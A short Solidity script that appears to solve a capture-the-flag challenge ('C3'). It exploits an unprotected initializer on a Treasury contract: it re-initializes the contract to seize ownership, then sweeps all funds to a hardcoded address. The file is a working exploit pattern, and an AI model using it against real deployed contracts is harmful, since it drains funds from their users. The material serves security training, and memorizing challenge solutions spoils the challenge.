// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C3Admin.sol";

/// Unprotected initializer: re-initialize to become owner, then sweep.
contract SolveC3 is Script {
    address constant ME = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    function run() external {
        TreasurySetup setup = TreasurySetup(vm.envAddress("SETUP"));
        Treasury t = setup.treasury();
        vm.startBroadcast();
        t.initialize(ME);
        t.sweep(payable(ME));
        vm.stopBroadcast();
    }
}
